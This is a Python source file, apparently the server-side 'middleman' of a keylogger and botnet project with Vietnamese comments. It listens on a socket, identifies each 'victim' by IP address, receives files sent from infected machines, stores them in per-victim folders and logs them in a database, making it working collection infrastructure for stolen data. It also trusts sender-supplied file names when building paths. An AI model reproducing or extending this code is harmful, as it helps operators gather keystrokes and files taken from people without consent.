import os
import socket
from datetime import datetime
from database.connect.connect import connect_to_database, insert_file_info, close_connection
from database.connect.connect import get_victimid_by_ip  # Đảm bảo import hàm get_victimid_by_ip

def save_file(conn, filename, filesize, save_directory):
    """Lưu tệp nhận được vào thư mục."""
    try:
        filepath = os.path.join(save_directory, filename)
        with open(filepath, 'wb') as f:
            remaining = filesize
            while remaining > 0:
                chunk_size = 4096 if remaining >= 4096 else remaining
                chunk = conn.recv(chunk_size)
                if not chunk:
                    break
                f.write(chunk)
                remaining -= len(chunk)
            print(f"Received {filename} successfully! Saved to {filepath}")
        return filepath
    except Exception as e:
        print(f"Lỗi khi lưu tệp: {e}")
        return None

def receive_file(host, ip, port, save_directory='PBL4-Keylogger-BotNet/middleman/received_files'):
    """
    Nhận tệp qua socket, lưu vào thư mục và ghi thông tin vào cơ sở dữ liệu.
    """
    # Lấy victim_id từ IP
    victim_id = get_victimid_by_ip(ip)
    if victim_id is None:
        print(f"Không tìm thấy nạn nhân với IP {ip}.")
        return

    # Tạo thư mục lưu tệp nếu chưa tồn tại
    save_directory = os.path.join(save_directory, str(victim_id))  # Tạo thư mục cho từng victim_id
    if not os.path.exists(save_directory):
        os.makedirs(save_directory)
        print(f"Tạo thư mục {save_directory}")

    # Kết nối đến cơ sở dữ liệu
    db_connection = connect_to_database()
    if not db_connection:
        print("Không thể kết nối cơ sở dữ liệu. Thoát chương trình.")
        return

    # Thiết lập socket để nhận tệp
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"Đang lắng nghe tại {host}:{port}")
        conn, addr = s.accept()
        with conn:
            print(f"Đã kết nối với {addr}")
            while True:
                try:
                    file_info = conn.recv(1024).strip().decode('utf-8')
                    if not file_info:
                        print("No more file info received.")
                        return False

                    filename, filesize = file_info.split('|')
                    filesize = int(filesize)
                    print(f"Receiving {filename} with size {filesize} bytes")

                    # Lưu tệp vào thư mục
                    filepath = save_file(conn, filename, filesize, save_directory)
                    if filepath is None:
                        continue

                    # Lưu thông tin tệp vào cơ sở dữ liệu
                    upload_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    insert_file_info(db_connection, victim_id, filename, filepath, upload_time)
                except Exception as e:
                    print(f"Lỗi khi nhận tệp: {e}")
                    break

    # Đóng kết nối cơ sở dữ liệu
    close_connection(db_connection)
